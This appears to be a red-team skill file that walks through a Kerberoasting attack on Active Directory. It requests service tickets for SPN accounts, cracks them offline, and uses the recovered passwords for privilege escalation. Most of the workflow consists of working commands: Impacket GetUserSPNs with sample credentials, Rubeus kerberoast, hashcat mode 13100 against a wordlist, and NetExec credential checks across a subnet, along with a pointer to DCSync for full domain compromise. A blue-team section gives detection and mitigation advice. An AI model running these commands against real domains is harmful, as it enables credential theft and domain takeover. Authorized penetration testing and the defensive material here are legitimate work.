---
name: kerberoasting-active-directory
description: >
  Execute a Kerberoasting attack to extract Service Principal Name (SPN) ticket hashes from Active Directory 
  and crack them offline. This allows an attacker with any valid domain credentials to escalate privileges 
  by obtaining the plaintext password of highly-privileged service accounts.
domain: cybersecurity
subdomain: red-teaming
category: Credential Access
difficulty: intermediate
estimated_time: "1-2 hours"
mitre_attack:
  tactics: [TA0006]
  techniques: [T1558.003]
platforms: [windows]
tags: [active-directory, kerberos, kerberoasting, impacket, red-teaming, spn]
tools: [impacket-GetUserSPNs, hashcat, rubeus]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Kerberoasting Active Directory

## When to Use
- When you have compromised any standard, unprivileged Active Directory user account and need to escalate privileges.
- When you want to target service accounts, which often have weak passwords, high privileges (e.g., Domain Admin), and passwords that rarely expire.
- When you want to conduct a stealthy attack without executing code on the Domain Controller, as requesting Service Tickets (TGS) is a normal AD function.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Identifying Service Principal Names (SPNs)

```text
# Concept: In Windows domains, services (like SQL Server, IIS, Exchange) run under specific user 
# accounts. These accounts are associated with SPNs. To access a service, any user can request a 
# Ticket Granting Service (TGS) ticket for that SPN from the Domain Controller. The TGS is encrypted 
# with the password hash of the service account.

# Kerberoasting takes advantage of the fact that ANY domain user can request a TGS for ANY SPN.
```

### Phase 2: Requesting and Extracting TGS Tickets

```bash
# Using Impacket (from Kali Linux/attacker machine)
# Assuming you have compromised a standard user 'Bob' with password 'Welcome123!'

# 1. Identify kerberoastable accounts and request their TGS hashes
impacket-GetUserSPNs -request -dc-ip 10.0.0.5 'corp.local/Bob:Welcome123!' -outputfile hashes.txt

# Using Rubeus (from a compromised Windows endpoint)
# Run from a command prompt with Bob's context (e.g., Cobalt Strike beacon)
Rubeus.exe kerberoast /outfile:hashes.txt
```

### Phase 3: Offline Cracking

```bash
# Concept: The extracted TGS tickets are encrypted with the service account's NTLM hash (often RC4 encryption).
# You can use Hashcat to crack these hashes offline without generating any network traffic or lockouts.

# 1. Crack hashes using Hashcat with a wordlist (e.g., rockyou.txt)
# Hash type 13100 is for Kerberos 5 TGS-REP etype 23 (RC4)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -O

# 2. Review the cracked passwords
# Hashcat will output the plaintext password if a match is found in the wordlist.
# E.g., svc_sqluser:Password2023!
```

### Phase 4: Privilege Escalation

```bash
# Concept: Service accounts often possess excessive privileges. Once cracked, use the 
# plaintext password to authenticate and move laterally.

# 1. Verify credentials and check privileges using NetExec (nxc) / CrackMapExec
nxc smb 10.0.0.0/24 -u svc_sqluser -p 'Password2023!' --local-auth

# 2. If the service account is a Domain Admin, proceed with full domain compromise (e.g., DCSync).
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Compromise Standard User Account] --> B[Request TGS for SPNs using Impacket/Rubeus]
    B --> C{Are there accounts with SPNs?}
    C -->|Yes| D[Extract RC4/AES encrypted TGS Hashes]
    C -->|No| E[Kerberoasting not possible. Try AS-REP Roasting or BloodHound mapping]
    D --> F[Crack hashes offline via Hashcat]
    F --> G{Is hash cracked successfully?}
    G -->|Yes| H[Use plaintext password for Privilege Escalation & Lateral Movement]
    G -->|No| I[Attempt custom wordlists, rule-based cracking, or pivot to another vector]
```

## 🔵 Blue Team Detection & Defense
- **Strong Service Account Passwords**: The most effective mitigation is ensuring all service accounts have highly complex, randomly generated passwords of at least 25 characters. Use Managed Service Accounts (gMSA) where possible, as AD automatically rotates their highly complex 120-character passwords every 30 days.
- **Enforce AES Encryption**: RC4 (encryption type 23) is significantly easier to crack than AES (encryption type 18 or 17). Enforce AES-256 for all Kerberos authentication and disable RC4 across the domain via Group Policy.
- **Monitor for Anomalous TGS Requests**: Monitor Event ID 4769 (A Kerberos service ticket was requested). Specifically, look for a high volume of TGS requests with RC4 encryption (Ticket Encryption Type `0x17`) originating from a single user account in a short timeframe, which indicates automated Kerberoasting tools like Rubeus or GetUserSPNs.

## Key Concepts
| Concept | Description |
|---------|-------------|
| SPN | Service Principal Name. A unique identifier for a service instance, used by Kerberos to associate a service instance with a service logon account. |
| TGS | Ticket Granting Service ticket. A ticket requested by a user from the DC, encrypted with the target service account's password hash, used to access the service. |
| RC4 | A weak stream cipher (etype 23) historically used for Kerberos encryption in Active Directory. Easily cracked via brute-force if the underlying password is weak. |


## Output Format
```
Kerberoasting Active Directory — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- Mitre ATT&CK: [Steal or Forge Kerberos Tickets: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- Impacket: [GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
- Harmj0y: [Kerberoasting Without Mimikatz](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
